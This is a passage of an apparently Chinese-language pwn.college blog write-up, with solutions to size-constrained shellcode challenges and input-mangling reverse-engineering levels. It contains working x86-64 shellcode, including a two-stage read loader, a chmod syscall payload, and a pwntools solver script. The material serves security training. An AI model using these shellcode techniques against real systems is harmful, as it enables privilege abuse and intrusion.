class="hljs-number">0x5a</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">syscall</span><br>    <br></code></pre></td></tr></table></figure><h4 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h4><p>This challenge requires that every byte in your shellcode is unique!</p><p>这一关需要每个字节是第一次使用，也就是没有重复的字节出现。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x61</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">bl</span>, <span class="hljs-number">0x4</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">esi</span>, <span class="hljs-built_in">ebx</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">0x5a</span><br>    <span class="hljs-keyword">syscall</span><br><br></code></pre></td></tr></table></figure><blockquote><p>我居然一直不知道esi寄存器的存在，我以为只有a,b,c,d寄存器会有32位，16位，8位寄存器。</p><p>通用寄存器都有低至16位的寄存器。</p></blockquote><h4 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h4><p>限制shellcode为0xc个字节！上面的exp还能删减一下。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x61</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">esi</span>, <span class="hljs-number">0x4</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">0x5a</span><br>    <span class="hljs-keyword">syscall</span><br><br></code></pre></td></tr></table></figure><p>这样就正好是0xc个字节。</p><h4 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h4><p>shellcode只能是6个字节，我靠。看看人家的wp做吧，没有什么思路。</p><p>发现得用当时的一些寄存器来达成目标。在调用我们的shellcode时，可以看到rax是0。并且</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"> <span class="hljs-built_in">RAX</span>  <span class="hljs-number">0x0</span><br> <span class="hljs-built_in">RBX</span>  <span class="hljs-number">0x627f8b68e7e0</span> (__libc_csu_init) ◂— endbr64 <br> <span class="hljs-built_in">RCX</span>  <span class="hljs-number">0x766dd2e1e297</span> (write+<span class="hljs-number">23</span>) ◂— <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rax</span>, -<span class="hljs-number">01000h</span> /* <span class="hljs-string">&#x27;H=&#x27;</span> */<br> <span class="hljs-built_in">RDX</span>  <span class="hljs-number">0x26a69000</span> ◂— <span class="hljs-keyword">push</span> <span class="hljs-number">61h</span> /* <span class="hljs-number">0x83e78948616a</span> */<br> <span class="hljs-built_in">RDI</span>  <span class="hljs-number">0x766dd2efe7e0</span> (_IO_stdfile_1_lock) ◂— <span class="hljs-number">0x0</span><br> <span class="hljs-built_in">RSI</span>  <span class="hljs-number">0x766dd2efd723</span> (_IO_2_1_stdout_+<span class="hljs-number">131</span>) ◂— <span class="hljs-number">0xefe7e0000000000a</span> /* <span class="hljs-string">&#x27;\n&#x27;</span> */<br> <span class="hljs-built_in">R8</span>   <span class="hljs-number">0x16</span><br> <span class="hljs-built_in">R9</span>   <span class="hljs-number">0x10</span><br> <span class="hljs-built_in">R10</span>  <span class="hljs-number">0x627f8b68f113</span> ◂— <span class="hljs-number">0x525245000000000a</span> /* <span class="hljs-string">&#x27;\n&#x27;</span> */<br> <span class="hljs-built_in">R11</span>  <span class="hljs-number">0x246</span><br> <span class="hljs-built_in">R12</span>  <span class="hljs-number">0x627f8b68e200</span> (_start) ◂— endbr64 <br> <span class="hljs-built_in">R13</span>  <span class="hljs-number">0x7ffe2e2e5a80</span> ◂— <span class="hljs-number">0x1</span><br> <span class="hljs-built_in">R14</span>  <span class="hljs-number">0x0</span><br> <span class="hljs-built_in">R15</span>  <span class="hljs-number">0x0</span><br> <span class="hljs-built_in">RBP</span>  <span class="hljs-number">0x7ffe2e2e5990</span> ◂— <span class="hljs-number">0x0</span><br>*<span class="hljs-built_in">RSP</span>  <span class="hljs-number">0x7ffe2e2e5948</span> —▸ <span class="hljs-number">0x627f8b68e7c3</span> (main+<span class="hljs-number">636</span>) ◂— <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rip</span> + <span class="hljs-number">0cdah</span>]<br>*<span class="hljs-built_in">RIP</span>  <span class="hljs-number">0x26a69000</span> ◂— <span class="hljs-keyword">push</span> <span class="hljs-number">61h</span> /* <span class="hljs-number">0x83e78948616a</span> */<br></code></pre></td></tr></table></figure><p>rax为0，那么就是read系统调用号。read系统调用的第一个参数rdi为文件描述符，需要为0。第二个参数rsi为读取存放的地址，这里应该就是rdx&#x2F;rdi都行。第三个参数rdx为0x26a6900为写入的字节数。</p><p>那么也就是需要重写rdi寄存器和rsi寄存器即可。stageone的代码：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">edi</span>, <span class="hljs-built_in">edi</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">esi</span>, <span class="hljs-built_in">edx</span><br>    <span class="hljs-keyword">syscall</span><br><br></code></pre></td></tr></table></figure><p>随后，把stagetwo的代码读入即可。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-meta">    .rept</span> <span class="hljs-number">0x10</span><br>    <span class="hljs-keyword">nop</span><br><span class="hljs-meta">    .endr</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x61</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">esi</span>, <span class="hljs-number">0x4</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">0x5a</span><br>    <span class="hljs-keyword">syscall</span><br><br></code></pre></td></tr></table></figure><p>需要一个填充，因为前六个字节也被覆盖了，因此执行只能从第七个字节开始。</p><p>最后的命令是<code>cat stageone-raw shellcode-raw | /challenge/babyshell_level14</code>。抽象的是，我在gdb里调试了半天，stageone的代码一直无法进行系统调用，我以为是代码的问题，实际上是权限不够，无法进行syscall。</p><h3 id="Reverse-Engineering"><a href="#Reverse-Engineering" class="headerlink" title="Reverse Engineering"></a>Reverse Engineering</h3><h4 id="level1-0"><a href="#level1-0" class="headerlink" title="level1.0"></a>level1.0</h4><p>这题很简单哇，就是把输入的字符串转成了ascii。对应输入即可获得flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Ready</span> to receive your license key!<br><br><span class="hljs-attribute">quit</span><br><span class="hljs-attribute">Initial</span> input:<br><br>        <span class="hljs-attribute">71</span> <span class="hljs-number">75</span> <span class="hljs-number">69</span> <span class="hljs-number">74</span> <span class="hljs-number">0</span>a <br><br><span class="hljs-attribute">The</span> mangling is done! The resulting bytes will be used for the final comparison.<br><br><span class="hljs-attribute">Final</span> result of mangling input:<br><br>        <span class="hljs-attribute">71</span> <span class="hljs-number">75</span> <span class="hljs-number">69</span> <span class="hljs-number">74</span> <span class="hljs-number">0</span>a <br><br><span class="hljs-attribute">Expected</span> result:<br><br>        <span class="hljs-attribute">63</span> <span class="hljs-number">6</span>c <span class="hljs-number">6</span>a <span class="hljs-number">79</span> <span class="hljs-number">62</span> <br><br><span class="hljs-attribute">Checking</span> the received license key!<br></code></pre></td></tr></table></figure><h4 id="level1-1"><a href="#level1-1" class="headerlink" title="level1.1"></a>level1.1</h4><p>这下没有回显了，只能通过工具逆向一下子了。</p><img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241107202238497.png" class="" title="image-20241107202238497"><p>也很简单啊，直接看到了匹配的字符串。</p><h4 id="level2-0"><a href="#level2-0" class="headerlink" title="level2.0"></a>level2.0</h4><p>依然，使用IDA 看看：</p><img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241107202710303.png" class="" title="image-20241107202710303"><p>但是输入会把最后两个字节翻转。最后输入xzujs即可。</p><h4 id="level2-1"><a href="#level2-1" class="headerlink" title="level2.1"></a>level2.1</h4><p>依然是，没有回显。简单查看一下逆向出来的源码。</p><img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241107204303139.png" class="" title="image-20241107204303139"><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>+buf+<span class="hljs-number">2</span>]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>+var_10], <span class="hljs-built_in">al</span><br><span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>+buf+<span class="hljs-number">3</span>]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>+var_10+<span class="hljs-number">1</span>], <span class="hljs-built_in">al</span><br><span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>+var_10+<span class="hljs-number">1</span>]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>+buf+<span class="hljs-number">2</span>], <span class="hljs-built_in">al</span><br><span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>+var_10]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>+buf+<span class="hljs-number">3</span>], <span class="hljs-built_in">al</span><br></code></pre></td></tr></table></figure><p>其中，<code>rbp+buf</code>是用户输入的地址。按照逻辑分析：该代码将用户输入的第3个字节给了<code>rbp+var_10</code>位置。第4个字节给了<code>rbp+var_10+1</code>位置，随后第4个字节给了第3个字节位置。第3个字节给了第4个字节位置。综合起来即，将用户输入的第三、四个字节位置交换。</p><p>那么输入<code>loodc</code>即可。</p><h4 id="level3-0"><a href="#level3-0" class="headerlink" title="level3.0"></a>level3.0</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">quit</span><br><span class="hljs-attribute">Initial</span> input:<br><br>        <span class="hljs-attribute">71</span> <span class="hljs-number">75</span> <span class="hljs-number">69</span> <span class="hljs-number">74</span> <span class="hljs-number">0</span>a <br><br><span class="hljs-attribute">This</span> challenge is now mangling your input using the `reverse` mangler.<br><br><span class="hljs-attribute">This</span> mangled your input, resulting in:<br><br>        <span class="hljs-attribute">0a</span> <span class="hljs-number">74</span> <span class="hljs-number">69</span> <span class="hljs-number">75</span> <span class="hljs-number">71</span> <br></code></pre></td></tr></table></figure><p>显然，这是将输入进行逆序了。<img src="/2025/03/01/pwn-college-题解/image-20241107210124444.png"  alt="image-20241107210124444" style="zoom:200%;" /></p><p>其实也不用IDA，通过回显的ASCII码可以推出要的结果。</p><p>最后输入<code>sikky</code>即可。</p><h4 id="level3-1"><a href="#level3-1" class="headerlink" title="level3.1"></a>level3.1</h4><p>查看源码：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">loc_153E:</span><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">rbp</span>+var_14]<br><span class="hljs-keyword">cdqe</span><br><span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>+<span class="hljs-built_in">rax</span>+buf]<br><span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rbp</span>+var_16], <span class="hljs-built_in">al</span><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">4</span><br><span class="hljs-keyword">sub</span>     <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">rbp</span>+var_14]<br><span class="hljs-keyword">cdqe</span><br><span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>+<span class="hljs-built_in">rax</span>+buf]<br><span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rbp</span>+var_15], <span class="hljs-built_in">al</span><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">rbp</span>+var_14]<br><span class="hljs-keyword">cdqe</span><br><span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">edx</span>, [<span class="hljs-built_in">rbp</span>+var_15]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>+<span class="hljs-built_in">rax</span>+buf], <span class="hljs-built_in">dl</span><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">4</span><br><span class="hljs-keyword">sub</span>     <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">rbp</span>+var_14]<br><span class="hljs-keyword">cdqe</span><br><span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">edx</span>, [<span class="hljs-built_in">rbp</span>+var_16]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>+<span class="hljs-built_in">rax</span>+buf], <span class="hljs-built_in">dl</span><br><span class="hljs-keyword">add</span>     [<span class="hljs-built_in">rbp</span>+var_14], <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241107211657926.png" class="" title="image-20241107211657926"><blockquote><p>cdqe指令：EAX符号位拓展到RAX</p></blockquote><img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241107212701406.png" class="" title="image-20241107212701406"><p>有点抽象的是，无法知道[rbp+var_14]的值，因此手动分析不出来哇。通过IDA查看源码，发现循环了两次，第一次是交换第一个字节和第5个字节。第二次是交换第二个字节和第4个字节。因此就是一个逆序。</p><p>然后，<img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241107213541957.png" class="" title="image-20241107213541957"></p><p>最后输入<code>ruhsi</code>即可。</p><h4 id="level4-0"><a href="#level4-0" class="headerlink" title="level4.0"></a>level4.0</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">quit</span><br><span class="hljs-attribute">Initial</span> input:<br><br>        <span class="hljs-attribute">71</span> <span class="hljs-number">75</span> <span class="hljs-number">69</span> <span class="hljs-number">74</span> <span class="hljs-number">0</span>a <br><br><span class="hljs-attribute">This</span> challenge is now mangling your input using the `sort` mangler.<br><br><span class="hljs-attribute">This</span> mangled your input, resulting in:<br><br>        <span class="hljs-attribute">0a</span> <span class="hljs-number">69</span> <span class="hljs-number">71</span> <span class="hljs-number">74</span> <span class="hljs-number">75</span><br></code></pre></td></tr></table></figure><p>最后一个字节，去了第一个位置。第三个字节去了第二个位置，第一个字节去了第三个位置，第四个位置没动，第二个字节去了第五个位置。</p><p><code>66 71 72 77 78</code>，这是期待的字符串，也就是<code>fqrwx</code></p><p>最后输入<code>xrfwq</code>即可。</p><p>qfxwr</p><h4 id="level4-1"><a href="#level4-1" class="headerlink" title="level4.1"></a>level4.1</h4><p>这道题也是一样的，按照上面的逻辑进行翻转。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">3</span>; ++i )<br> &#123;<br>   <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span> - i; ++j )<br>   &#123;<br>     <span class="hljs-keyword">if</span> ( *((_BYTE *)&amp;buf + j) &gt; *((_BYTE *)&amp;buf + j + <span class="hljs-number">1</span>) )<br>     &#123;<br>       v3 = *((_BYTE *)&amp;buf + j);<br>       *((_BYTE *)&amp;buf + j) = *((_BYTE *)&amp;buf + j + <span class="hljs-number">1</span>);<br>       *((_BYTE *)&amp;buf + j + <span class="hljs-number">1</span>) = v3;<br>     &#125;<br>   &#125;<br> &#125;<br></code></pre></td></tr></table></figure><blockquote><p>分析一下，i &#x3D; 0 的情况下，j由0到3，前五个字节。那么这里会有一个判断，即将ascii值最大的字节放至第5个位置；i &#x3D; 1的情况下，j由0到2，前4个字节。将ascii值最大的字节放至第4个位置。以此类推。这是冒泡排序，对前5个字节进行冒泡排序。将ascii码值由小到大排序。</p></blockquote><img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241107214343087.png" class="" title="image-20241107214343087"><p>最后输入<code>almrv的任意排序</code>即可。因此，我在level4.0发现的规律是错误的。</p><h4 id="level5-0"><a href="#level5-0" class="headerlink" title="level5.0"></a>level5.0</h4><p>This challenge is now mangling your input using the <code>xor</code> mangler with key <code>0xb7</code></p><p>与0xb7异或。异或的操作是可逆的，那么再异或回去就好了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-type">Type</span> <span class="hljs-string">&quot;help&quot;</span>, <span class="hljs-string">&quot;copyright&quot;</span>, <span class="hljs-string">&quot;credits&quot;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;license&quot;</span> <span class="hljs-keyword">for</span> more information.<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-number">0xc3</span> ^ <span class="hljs-number">0xb7</span><br><span class="hljs-number">116</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">hex</span>(<span class="hljs-number">0xc3</span> ^ <span class="hljs-number">0xb7</span>)<br><span class="hljs-string">&#x27;0x74&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">hex</span>(<span class="hljs-number">0xc2</span> ^ <span class="hljs-number">0xb7</span>)<br><span class="hljs-string">&#x27;0x75&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">hex</span>(<span class="hljs-number">0xdf</span> ^ <span class="hljs-number">0xb7</span>)<br><span class="hljs-string">&#x27;0x68&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">hex</span>(<span class="hljs-number">0xc7</span> ^ <span class="hljs-number">0xb7</span>)<br><span class="hljs-string">&#x27;0x70&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">hex</span>(<span class="hljs-number">0xc4</span> ^ <span class="hljs-number">0xb7</span>)<br><span class="hljs-string">&#x27;0x73&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><br></code></pre></td></tr></table></figure><p>用python终端，即可。最终输入<code>tuhps</code>即可。</p><h4 id="level5-1"><a href="#level5-1" class="headerlink" title="level5.1"></a>level5.1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">4</span>; ++i )<br>    *((_BYTE *)&amp;buf + i) ^= <span class="hljs-number">0x41u</span>;<br></code></pre></td></tr></table></figure><p>异或的字节为0x41，目标字符串是<code>.data:0000000000004010 a056            db &#39;0&#39;,27h,27h,&#39;56&#39;,0</code></p><p>异或一下。最终输入<code>qfftw</code>即可。</p><h4 id="level6-0"><a href="#level6-0" class="headerlink" title="level6.0"></a>level6.0</h4><p>This challenge is now mangling your input using the <code>xor</code> mangler with key <code>0xbf46</code></p><p>This challenge is now mangling your input using the <code>sort</code> mangler.</p><p>This challenge is now mangling your input using the <code>swap</code> mangler for indexes <code>0</code> and <code>9</code>.</p><p>强度一下就上来啦，xor，sort和swap三种方法。</p><p>目标</p><p>字符串为：<code>cd 20 25 27 27 28 31 35 c8 20 ce cf d1 d5 d9 dc</code>，写个脚本跑就好了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;/challenge/babyrev_level6.0&quot;</span>)<br><br><span class="hljs-comment"># 20 20 25 27 27 28 31 35 c8 cd ce cf d1 d5 d9 dc</span><br>hex_string=[<span class="hljs-number">0x20</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x25</span>,<span class="hljs-number">0x27</span>,<span class="hljs-number">0x27</span>,<span class="hljs-number">0x28</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x35</span>,<span class="hljs-number">0xc8</span>,<span class="hljs-number">0xcd</span>,<span class="hljs-number">0xce</span>,<span class="hljs-number">0xcf</span>,<span class="hljs-number">0xd1</span>,<span class="hljs-number">0xd5</span>,<span class="hljs-number">0xd9</span>,<span class="hljs-number">0xdc</span>]<br>payload=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-comment"># xor</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(hex_string) - <span class="hljs-number">1</span>, <span class="hljs-number">2</span>):<br>    <span class="hljs-built_in">print</span>(i)<br>    payload += <span class="hljs-built_in">chr</span>(hex_string[i] ^ <span class="hljs-number">0xbf</span>)<br>    payload += <span class="hljs-built_in">chr</span>(hex_string[i+<span class="hljs-number">1</span>] ^ <span class="hljs-number">0x46</span>)<br><br><br><span class="hljs-built_in">print</span>(payload)<br>io.sendafter(<span class="hljs-string">&#x27;Ready to receive your license key!\n&#x27;</span>,payload)<br><br>data = io.recvall()<br><span class="hljs-built_in">print</span>(data.decode())<br><br></code></pre></td></tr></table></figure><blockquote><p>因为有sort的关系，并且最终的结果也确实sort后swap就能达到。因此只需要将目标字符串从小到大排序后，异或0xbf46即可。</p></blockquote><h4 id="level6-1"><a href="#level6-1" class="headerlink" title="level6.1"></a>level6.1</h4><p><strong><img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241108212052627.png" class="" title="image-20241108212052627"></strong></p><p>目标字符串为<code>0x80, 0xD8, 0x4E, 0xC7, 0X99, 0x0B, 0x8B, 0xC8, 0x45, 0xC0, 0x86, 0x06, 0x84, 0xC2, 0x5F, 0xD6, 0x82, 0x03, 0x83</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">18</span>; ++i )<br>&#123;<br>  v3 = i % <span class="hljs-number">3</span>;<br>  <span class="hljs-keyword">if</span> ( i % <span class="hljs-number">3</span> == <span class="hljs-number">2</span> )<br>  &#123;<br>    *((_BYTE *)buf + i) ^= <span class="hljs-number">0xEBu</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( v3 &lt;= <span class="hljs-number">2</span> )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( v3 )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">1</span> )<br>        *((_BYTE *)buf + i) ^= <span class="hljs-number">0x37u</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      *((_BYTE *)buf + i) ^= <span class="hljs-number">0xF1u</span>;<br>    &#125;<br>  &#125;<br>&#125;<br><span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j 